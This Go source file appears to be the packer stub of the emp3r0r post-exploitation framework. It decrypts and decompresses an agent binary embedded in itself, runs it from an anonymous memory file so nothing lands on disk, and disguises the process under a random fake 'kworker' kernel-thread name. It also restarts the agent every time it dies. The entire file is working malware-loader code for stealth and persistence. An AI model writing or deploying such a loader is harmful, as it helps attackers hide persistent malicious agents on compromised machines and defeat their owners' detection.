//go:build linux
// +build linux

package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"os"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archiver"
)

func main() {
	// find embeded ELF
	read_elf_bytes, err := util.ExtractData()
	if err != nil {
		log.Fatalf("Searching for agent ELF: %v", err)
	}

	// decrypt attached ELF file
	key := tun.GenAESKey(emp3r0r_data.MagicString)
	elfdata := tun.AESDecryptRaw(key, read_elf_bytes)
	if elfdata == nil {
		log.Fatalf("AESDecrypt failed: length of cipher text is %d bytes", len(read_elf_bytes))
	}

	// decompress
	var decompressedBytes []byte
	gz := &archiver.Gz{CompressionLevel: 9}
	r := bytes.NewReader(elfdata)
	extracted_agent_elf := bytes.NewBuffer(decompressedBytes)
	err = gz.Decompress(r, extracted_agent_elf)
	if err != nil {
		log.Fatalf("Decompress ELF: %v", err)
	}

	// write self to memfd
	self_elf_data, err := ioutil.ReadFile(os.Args[0])
	if err != nil {
		log.Printf("read self: %v", err)
	}
	fd := util.MemFDWrite(self_elf_data)
	if fd < 0 {
		log.Print("MemFDWrite failed")
	}
	// extract config JSON
	// set env so that agent can read config from it
	config_data, err := util.DigEmbeddedData(extracted_agent_elf.Bytes())
	if err != nil {
		log.Printf("Extract config data from agent ELF: %v", err)
		config_data = []byte("invalid_json_config")
	}
	env := []string{
		"FD=" + fmt.Sprintf("/proc/%d/fd/%d", os.Getpid(), fd),
		"MOTD=" + fmt.Sprintf("%s", config_data),
	}

	for {
		// run from memfd
		procName := fmt.Sprintf("[kworker/%d:%s]", util.RandInt(5, 12), util.RandStr(7))
		child := util.MemfdExec(procName, env, extracted_agent_elf.Bytes())

		for {
			util.TakeASnap()

			// guard child
			if !util.IsPIDAlive(child) {
				break
			}
		}
		log.Printf("%d died, restarting", child)
	}
}
